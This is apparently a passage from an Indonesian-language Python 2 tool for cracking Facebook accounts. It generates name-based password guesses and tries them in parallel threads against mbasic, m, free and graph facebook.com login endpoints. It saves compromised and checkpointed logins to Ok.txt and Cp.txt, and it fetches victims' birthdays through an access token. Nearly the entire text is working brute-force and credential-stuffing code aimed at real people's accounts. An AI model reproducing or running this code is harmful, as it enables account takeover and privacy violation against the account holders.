	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def graph(em,pas,hosts):
	global ua,graph_h
	r=requests.Session()
	r.headers.update(graph_h)
	p=r.get("https://graph.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	dtg="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":dtg,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://graph.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://graph.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def mbasic2(em,pas,hosts):
	global ua,mbasic_h2
	r=requests.Session()
	r.headers.update(mbasic_h2)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def metode():
    print ('\n [1] Metode Crack mbasic.facebook.com')
    print (' [2] Metode Crack m.facebook.com')
    print (' [3] Metode Crack free.facebook.com')
    print (' [4] Metode Crack graph.facebook.com')
    md = raw_input(' [*] Input : ')
    if md == '':
        os.sys.exit()
    elif md == '1' or md == '01':
      ttl = raw_input('\n [*] Crack Pakai Tanggal Lahir (y/n) : ')
      if ttl == '':
          menu()
      elif ttl == 'y' or ttl == 'Y':
          crack1()
      elif ttl == 'n' or ttl == 'N':
          crack()
      else:
          exit(' [x] Isi Dengan Benar')
    elif md == '2' or md == '02':
	crack2()
    elif md == '3' or md == '03':
	crack3()
    elif md == '4' or md == '04':
	crack4()
    else:
        exit(' [x] Isi Dengan Benar')
def generate(text):
	global lok
	results=[]
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in lok:
                                        results.append("sayang")
				if "pakistan" in lok:
					results.append("786786")
				if "bangladesh" in lok:
					results.append("102030")
	return results
class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input(" [*] Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Ada')
					continue
				print(' [•] Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Valid')
					menu()
					continue
				print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
				print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(" [*] Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
                        print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"      "))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("Cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input(" [*] Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Ada')
					continue
				print(' [•] Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Valid')
					menu()
					continue
				print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
				print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(" [*] Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
                        print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic2(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					try:
						tomken = open('login.txt','r').read()
						q = requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+tomken)
						qw = json.loads(q.text)
						ttl = qw["birthday"]
						month, day, year = ttl.split("/")
						tl = day+'/'+month+'/'+year

					except (KeyError, IOError):
					 tl = ' '
					except:pass
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;96m "+tl+"    "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n [*] Pakai Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Ada')
					continue
				print(' [•] Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Valid')
					menu()
					continue
				print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
				print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(" [*] Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
                        print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log = mfb(fl.get('id'), i, 'https://m.facebook.com')
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"      "))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("Cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack3:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n [*] Pakai Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Ada')
					continue
				print(' [•] Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Valid')
					menu()
					continue
				print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
				print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(" [*] Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
                        print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=free(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"      "))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("Cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack4:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n [*] Pakai Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Ada')
					continue
				print(' [•] Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(' [*] Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' [x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' [x] File Tidak Valid')
					menu()
					continue
				print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
				print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(" [*] Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n [•] Hasil Ok Tersimpan Di Ok.txt')
                        print(' [•] Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=graph(fl.get("id"),
					i,"https://graph.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"      "))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("Cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

if __name__=='__main__':
	os.system('git pull')
	cek_cookies()